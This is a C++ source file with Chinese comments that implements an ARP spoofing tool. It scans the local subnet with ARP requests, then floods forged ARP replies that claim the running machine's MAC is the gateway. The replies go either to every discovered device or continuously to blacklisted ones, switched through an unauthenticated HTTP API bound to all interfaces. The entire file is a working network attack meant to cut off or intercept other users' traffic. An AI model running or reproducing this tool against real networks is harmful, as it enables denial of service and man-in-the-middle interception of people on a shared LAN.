#include <httplib.h>
#include <nlohmann/json.hpp>
#include <vector>
#include <set>
#include <mutex>
#include <iostream>
#include <string>
#include <cstring>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <unistd.h>
#include <ifaddrs.h>
#include <linux/if_packet.h>
#include <net/ethernet.h>
#include <pcap/pcap.h>
#include <algorithm>
#include <thread>
#include <atomic>


using namespace httplib;
using json = nlohmann::json;

// 公共数据结构
struct Device {
  std::string name;
  std::string ip;
  std::string mac;
};

struct InterfaceInfo {
  std::string name;
  struct in_addr ip_addr;
  struct in_addr netmask;
  uint8_t mac_addr[6];
};

struct arp_header {
  uint16_t hardware_type;
  uint16_t protocol_type;
  uint8_t hardware_size;
  uint8_t protocol_size;
  uint16_t opcode;
  uint8_t sender_mac[6];
  uint8_t sender_ip[4];
  uint8_t target_mac[6];
  uint8_t target_ip[4];
};

// 全局状态
std::mutex mtx;
std::atomic<bool> running{false};
std::vector<Device> devices;
std::unordered_set<std::string> blacklist;
InterfaceInfo iface_info;
std::string gateway_ip;
pcap_t* pcap_handle = nullptr;
std::atomic<bool> switch_status{true};


// 将6字节MAC地址转换为字符串格式
std::string mac_to_string(const uint8_t mac[6]) 
{
	char buffer[18];
	snprintf(buffer, sizeof(buffer),
					"%02X:%02X:%02X:%02X:%02X:%02X",
					mac[0], mac[1], mac[2],
					mac[3], mac[4], mac[5]);
	return std::string(buffer);
}

// 逆向转换
bool string_to_mac(const std::string& str, uint8_t mac[6]) 
{
  unsigned int values[6];
  int count = sscanf(str.c_str(), "%02X:%02X:%02X:%02X:%02X:%02X",
                   &values[0], &values[1], &values[2],
                   &values[3], &values[4], &values[5]);
  if (count != 6) return false;
  
  for(int i=0; i<6; i++) 
    mac[i] = static_cast<uint8_t>(values[i]);
  return true;
}

// 目标设备信息结构
struct TargetInfo {
  std::string ip;
  uint8_t mac[6];
  
  bool operator==(const TargetInfo& other) const {
		return ip == other.ip && 
				 std::equal(mac, mac+6, other.mac);
	}
};

// 验证IP格式
bool is_valid_ip(const std::string& ip) 
{
  static const std::regex ip_pattern(R"((\d{1,3}\.){3}\d{1,3})");
  return std::regex_match(ip, ip_pattern);
}

// 执行shell命令
std::string execute_command(const std::string& cmd) 
{
  FILE* fp = popen(cmd.c_str(), "r");
  if (!fp) return "";
  
  char buffer[256];
  std::string result;
  while (fgets(buffer, sizeof(buffer), fp)) {
    result += buffer;
  }
  pclose(fp);
  return result;
}

// 获取网关IP
std::string get_gateway_ip(void) 
{
  std::string output = execute_command("ip route | grep default");
  size_t pos = output.find("via ");
  return (pos != std::string::npos) ? 
         output.substr(pos + 4, output.find(' ', pos + 4) - (pos + 4)) : "";
}

// 获取默认接口名称
std::string get_default_interface(void) 
{
  std::string output = execute_command("ip route | grep default | awk '{print $5}'");
  output.erase(std::remove(output.begin(), output.end(), '\n'), output.end());
  return output;
}


// 获取单个接口的MAC地址
void get_interface_mac(const std::string& name, uint8_t* mac) 
{
  struct ifreq ifr;
  int sock = socket(AF_INET, SOCK_DGRAM, 0);
  if (sock < 0) return;

  strncpy(ifr.ifr_name, name.c_str(), IFNAMSIZ);
  if (ioctl(sock, SIOCGIFHWADDR, &ifr) == 0) {
    memcpy(mac, ifr.ifr_hwaddr.sa_data, 6);
  }
  close(sock);
}

// 获取网络接口列表
std::vector<InterfaceInfo> get_network_interfaces() {
  std::vector<InterfaceInfo> interfaces;
  struct ifaddrs *ifaddr;
  
  // 使用map暂存接口信息
  std::map<std::string, InterfaceInfo> interface_map;

  if (getifaddrs(&ifaddr) == -1) return interfaces;

  // 第一遍遍历：获取所有接口的MAC地址
  for (auto ifa = ifaddr; ifa; ifa = ifa->ifa_next) {
    if (ifa->ifa_addr && ifa->ifa_addr->sa_family == AF_PACKET) {
      InterfaceInfo info;
      info.name = ifa->ifa_name;
      get_interface_mac(info.name, info.mac_addr);
      interface_map[info.name] = info;
    }
  }

  // 第二遍遍历：获取IPv4地址
  for (auto ifa = ifaddr; ifa; ifa = ifa->ifa_next) {
    if (ifa->ifa_addr && ifa->ifa_addr->sa_family == AF_INET) {
      auto it = interface_map.find(ifa->ifa_name);
      if (it != interface_map.end()) {
        auto ip = reinterpret_cast<sockaddr_in*>(ifa->ifa_addr);
        auto mask = reinterpret_cast<sockaddr_in*>(ifa->ifa_netmask);
        it->second.ip_addr = ip->sin_addr;
        it->second.netmask = mask->sin_addr;
      }
    }
  }

  // 转换map到vector
  for (auto& [name, info] : interface_map) {
    interfaces.push_back(info);
  }

  freeifaddrs(ifaddr);
  return interfaces;
}

// 生成IP地址范围
std::vector<std::string> generate_ip_range(in_addr ip, in_addr netmask) 
{
  std::vector<std::string> ips;
  uint32_t host = ntohl(ip.s_addr);
  uint32_t mask = ntohl(netmask.s_addr);
  uint32_t network = host & mask;
  uint32_t broadcast = network | (~mask);

  for (uint32_t i = network + 1; i < broadcast; ++i) {
    struct in_addr addr;
    addr.s_addr = htonl(i);
    ips.push_back(inet_ntoa(addr));
  }
  return ips;
}

// 发送ARP请求包
void send_arp_requests(int sock, const InterfaceInfo& iface, const std::vector<std::string>& ip_list) 
{
  struct sockaddr_ll sa = {};
  sa.sll_family = AF_PACKET;
	sa.sll_protocol = htons(ETH_P_ARP);
  sa.sll_ifindex = if_nametoindex(iface.name.c_str());

  for (const auto& ip : ip_list) {
    struct ether_header eth;
    struct arp_header arp;

    // 构造以太网头
    memset(eth.ether_dhost, 0xFF, ETH_ALEN);
    memcpy(eth.ether_shost, iface.mac_addr, ETH_ALEN);
    eth.ether_type = htons(ETH_P_ARP);

    // 构造ARP头
    arp.hardware_type = htons(1);
    arp.protocol_type = htons(ETH_P_IP);
    arp.hardware_size = ETH_ALEN;
    arp.protocol_size = 4;
    arp.opcode = htons(1);

    memcpy(arp.sender_mac, iface.mac_addr, ETH_ALEN);
    memcpy(arp.sender_ip, &iface.ip_addr.s_addr, 4);
    memset(arp.target_mac, 0, ETH_ALEN);
    inet_pton(AF_INET, ip.c_str(), arp.target_ip);

    // 发送数据包
    char packet[sizeof(eth) + sizeof(arp)];
    memcpy(packet, &eth, sizeof(eth));
    memcpy(packet + sizeof(eth), &arp, sizeof(arp));
    sendto(sock, packet, sizeof(packet), 0, (struct sockaddr*)&sa, sizeof(sa));
  }
}

// 处理ARP响应包
TargetInfo process_arp_response(const uint8_t* buffer) 
{
  TargetInfo info;
  const struct arp_header* arp = reinterpret_cast<const arp_header*>(buffer + sizeof(ether_header));
  
  char ip_str[INET_ADDRSTRLEN];
  inet_ntop(AF_INET, arp->sender_ip, ip_str, sizeof(ip_str));
  info.ip = ip_str;
  memcpy(info.mac, arp->sender_mac, 6);
  
  return info;
}

// 执行ARP扫描
std::vector<TargetInfo> arp_scan(const InterfaceInfo &iface) 
{
  std::vector<TargetInfo> targets;
  int sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
  if (sock < 0) return targets;

  // 绑定网络接口
  struct sockaddr_ll sa = {};
  sa.sll_family = AF_PACKET;
  sa.sll_ifindex = if_nametoindex(iface.name.c_str());
  if (bind(sock, (struct sockaddr*)&sa, sizeof(sa)) < 0) {
    close(sock);
    return targets;
  }

  // 生成并发送ARP请求
  auto ip_list = generate_ip_range(iface.ip_addr, iface.netmask);
  send_arp_requests(sock, iface, ip_list);

  // 接收响应
  time_t start = time(nullptr);
  while (time(nullptr) - start < 2) {
    uint8_t buffer[4096];
    ssize_t len = recvfrom(sock, buffer, sizeof(buffer), 0, nullptr, nullptr);
    
    if (len >= static_cast<ssize_t>(sizeof(ether_header) + sizeof(arp_header))) {
      ether_header *eth = reinterpret_cast<ether_header*>(buffer);
      if (ntohs(eth->ether_type) == ETH_P_ARP) {
        arp_header *arp = reinterpret_cast<arp_header*>(buffer + sizeof(ether_header));
        if (ntohs(arp->opcode) == 2) {
          TargetInfo info = process_arp_response(buffer);
          if (std::find(targets.begin(), targets.end(), info) == targets.end()) {
            targets.push_back(info);
          }
        }
      }
    }
  }

  close(sock);
  return targets;
}

bool is_valid_mac(const std::string& mac) 
{
  return std::regex_match(mac, std::regex("^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$"));
}

// 创建ARP响应包
arp_header create_arp_reply(const uint8_t* src_mac, const std::string& src_ip, const uint8_t* dst_mac, const std::string& dst_ip) 
{
  arp_header arp;
  arp.hardware_type = htons(1);
  arp.protocol_type = htons(ETH_P_IP);
  arp.hardware_size = ETH_ALEN;
  arp.protocol_size = 4;
  arp.opcode = htons(2);
  
  memcpy(arp.sender_mac, src_mac, 6);
  inet_pton(AF_INET, src_ip.c_str(), arp.sender_ip);
  memcpy(arp.target_mac, dst_mac, 6);
  inet_pton(AF_INET, dst_ip.c_str(), arp.target_ip);
  
  return arp;
}

// 发送ARP欺骗包
#define ARP_SPOOF_PACKET_COUNT 100

void send_spoof_packet(pcap_t* handle, const TargetInfo& target, const uint8_t* attacker_mac, const std::string& gateway_ip) 
{
  // 检查目标IP是否与网关IP相同，如果相同则直接返回
  if (target.ip == gateway_ip) {
    return;
  }

  // 预先分配好数据包缓冲区
  static uint8_t packets[sizeof(ether_header) + sizeof(arp_header)];

  ether_header* eth = reinterpret_cast<ether_header*>(packets);
  arp_header* arp = reinterpret_cast<arp_header*>(packets + sizeof(ether_header));

  // 构造以太网头
  memcpy(eth->ether_dhost, target.mac, ETH_ALEN);
  memcpy(eth->ether_shost, attacker_mac, ETH_ALEN);
  eth->ether_type = htons(ETH_P_ARP);

  // 构造ARP头
  *arp = create_arp_reply(attacker_mac, gateway_ip, target.mac, target.ip);

  // 获取当前时间
  auto now = std::chrono::system_clock::now();
  auto now_time_t = std::chrono::system_clock::to_time_t(now);
  auto now_tm = *std::localtime(&now_time_t);

  // 输出带有时间的ARP欺诈提示，并包含欺诈的IP地址
  std::cout << "[" << std::put_time(&now_tm, "%Y-%m-%d %H:%M:%S") << "] ARP欺诈,目标IP: " << target.ip 
            << ",伪造网关IP: " << gateway_ip << std::endl;
  // 发送数据包
  for (int i = 0; i < ARP_SPOOF_PACKET_COUNT; ++i) {
    if (pcap_sendpacket(handle, packets, sizeof(ether_header) + sizeof(arp_header)) != 0) {
      std::cerr << "发送失败: " << pcap_geterr(handle) << std::endl;
    }

    usleep(300);
  }
}

// 初始化网络信息
InterfaceInfo initialize_network_info(void) 
{
  std::string iface_name = get_default_interface();
  auto interfaces = get_network_interfaces();
  auto it = std::find_if(interfaces.begin(), interfaces.end(), [&](const InterfaceInfo& info) { return info.name == iface_name; });
  return (it != interfaces.end()) ? *it : InterfaceInfo();
}

// 存储黑名单IP及其线程的映射
std::unordered_map<std::string, std::thread> blacklist_threads;
std::mutex blacklist_threads_mutex;
// 为黑名单IP启动线程并不断发送ARP数据包
void start_blacklist_thread(const std::string& ip, const uint8_t* mac, const std::string& gateway_ip, const uint8_t* attacker_mac, pcap_t* handle) {
  std::lock_guard<std::mutex> lock(blacklist_threads_mutex);
  
  // 检查是否已经存在该IP的线程
  if (blacklist_threads.find(ip) != blacklist_threads.end()) {
    std::cout << "线程已存在，不创建新线程: " << ip << std::endl;
    return;
  }

  // 创建新线程
  std::thread t([ip, mac, gateway_ip, attacker_mac, handle]() {
    TargetInfo target;
    target.ip = ip;
    memcpy(target.mac, mac, 6);

    std::string mac_str = mac_to_string(mac); // 将MAC地址转换为字符串
    while (true) {
      std::cout << blacklist.count(mac_str) << std::endl;
      std::lock_guard<std::mutex> lock(blacklist_threads_mutex);
      if (blacklist.count(mac_str) == 0) {
        break; // 如果IP已从黑名单中移除，则终止线程
      }
      // 确保每次发送前检查开关状态
      if (switch_status.load()) {
        send_spoof_packet(handle, target, attacker_mac, gateway_ip);
      }
    }
  });
  blacklist_threads[ip] = std::move(t);
}

// 网络工作线程
void network_worker(void) 
{
  while (running) {
    auto new_targets = arp_scan(iface_info);
    
    std::vector<Device> new_devices;
    for (const auto& t : new_targets) {
      new_devices.push_back({"Unknown", t.ip, mac_to_string(t.mac)});
    }
    {
      std::lock_guard<std::mutex> lock(mtx);
      devices.swap(new_devices);
    }

    if (pcap_handle) {
      std::lock_guard<std::mutex> lock(mtx);
      bool current_status = switch_status.load();
      for (const auto& t : new_targets) {
        // 根据开关状态决定发送策略
        if (!current_status) { // 关闭状态，广播发送
          send_spoof_packet(pcap_handle, t, iface_info.mac_addr, gateway_ip);
        } 
        else {
          // 检查是否在黑名单中
          std::string mac_str = mac_to_string(t.mac); // 将MAC地址转换为字符串
          if (blacklist.count(mac_str) > 0) {
            std::cout << "检测到黑名单设备: " << t.ip << std::endl;
            // 启动黑名单线程
            uint8_t mac_bytes[6];
            string_to_mac(mac_str, mac_bytes); // 转换回字节数组
            start_blacklist_thread(t.ip, mac_bytes, gateway_ip, iface_info.mac_addr, pcap_handle);
          }
        }
      }
    }
  }
}


// HTTP处理函数
void add_cors_headers(Response& res) 
{
  res.set_header("Access-Control-Allow-Origin", "*");
  res.set_header("Access-Control-Allow-Methods", "GET, POST, OPTIONS");
  res.set_header("Access-Control-Allow-Headers", "Content-Type");
}

void serve_html(const Request& req, Response& res) 
{
  std::ifstream file("./index.html");
  if (file) {
    std::string content((std::istreambuf_iterator<char>(file)), 
              std::istreambuf_iterator<char>());
    res.set_content(content, "text/html");
  } 
  else {
    res.status = 404;
    res.set_content("Not Found", "text/plain");
  }
}

int main(void) 
{
    // 初始化网络
    iface_info = initialize_network_info();
    gateway_ip = get_gateway_ip();
    if (iface_info.name.empty() || gateway_ip.empty()) {
        std::cerr << "网络初始化失败" << std::endl;
        return 1;
    }

    // 初始化pcap
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_handle = pcap_open_live(iface_info.name.c_str(), 65536, 1, 1000, errbuf);
    if (!pcap_handle) {
        std::cerr << "PCAP初始化失败: " << errbuf << std::endl;
        return 1;
    }

    // 启动网络工作线程
    running = true;
    std::thread(network_worker).detach();

    // 启动HTTP服务器
    Server svr;

    svr.Options(R"(.*)", [](const Request& req, Response& res) {
      add_cors_headers(res);
    });

    svr.Get("/", serve_html);

    svr.Get("/open", [](const Request& req, Response& res) {
      try {
        // 获取当前开关状态
        bool current_status = switch_status.load();

        // 构建响应
        json response;
        response["switch"] = current_status ? "on" : "off";

        // 添加CORS头
        add_cors_headers(res);

        // 返回响应
        res.set_content(response.dump(), "application/json");
      } 
      catch (...) {
        res.status = 500;
        json error_response = {{"error", "Internal server error"}};
        res.set_content(error_response.dump(), "application/json");
      }
    });

    svr.Post("/open", [](const Request& req, Response& res) {
      try {
        // 检查请求体是否为空
        if (req.body.empty()) {
          throw std::runtime_error("Request body is empty");
        }

          // 解析请求体中的JSON数据
        auto j = json::parse(req.body);

          // 检查并获取请求中的开关状态
        if (!j.contains("status")) {
          throw std::runtime_error("Missing 'status' field in request");
        }
        bool new_status = j["status"];

        // 更新全局的开关状态
        switch_status.store(new_status);

        // 构建响应
        json response;
        response["switch"] = switch_status.load() ? "on" : "off";

        // 添加CORS头
        add_cors_headers(res);

        // 返回响应
        res.set_content(response.dump(), "application/json");
      } 
      catch (const json::parse_error& e) {
        res.status = 400;
        json error_response = {{"error", "Invalid JSON format"}};
        res.set_content(error_response.dump(), "application/json");
      }
      catch (const std::exception& e) {
        res.status = 400;
        json error_response = {{"error", e.what()}};
        res.set_content(error_response.dump(), "application/json");
      }
      catch (...) {
        res.status = 500;
        json error_response = {{"error", "Internal server error"}};
        res.set_content(error_response.dump(), "application/json");
      }
    });

    svr.Get("/devices", [](const Request& req, Response& res) {
      std::lock_guard<std::mutex> lock(mtx);
      json response = json::array();
      for (const auto& d : devices) {
        if (d.ip != gateway_ip) {  // 过滤掉网关IP
          response.push_back({
            {"name", d.name},
            {"ip", d.ip},
            {"mac", d.mac},
            {"blacklisted", blacklist.count(d.mac) > 0}
          });
        }
      }
      add_cors_headers(res);
      res.set_content(response.dump(), "application/json");
    });
    svr.Post("/blacklist", [](const Request& req, Response& res) {
      try {
        auto j = json::parse(req.body);
        std::string mac = j["mac"];
        std::string ip = j["ip"];
        bool is_delete = j["delete"];
        
        if (!is_valid_mac(mac) || !is_valid_ip(ip)) {
          res.status = 400;
          res.set_content("Invalid MAC or IP", "text/plain");
          return;
        }

        uint8_t mac_bytes[6];
        string_to_mac(mac, mac_bytes);

        std::lock_guard<std::mutex> lock(mtx);
        if (is_delete) {
          blacklist.erase(mac);
          // 终止对应线程
          {
            std::lock_guard<std::mutex> thread_lock(blacklist_threads_mutex);
            if (blacklist_threads.find(ip) != blacklist_threads.end()) {
              if (blacklist_threads[ip].joinable()) {
                blacklist_threads[ip].join();
              }
              blacklist_threads.erase(ip);
            }
          }
        } 
        else {
          blacklist.insert(mac);
        }
        
        add_cors_headers(res);
        res.set_content(R"({"result": true})", "application/json");
      } 
      catch (...) {
        res.status = 400;
        res.set_content("Invalid request", "text/plain");
      }
    });
    std::cout << "Server started at http://127.0.0.1:8080\n";
    svr.listen("0.0.0.0", 8080);

    // 清理
    running = false;
    {
        std::lock_guard<std::mutex> lock(blacklist_threads_mutex);
        for (auto& [ip, thread] : blacklist_threads) {
            if (thread.joinable()) {
                thread.join();
            }
        }
    }
    pcap_close(pcap_handle);
    return 0;
}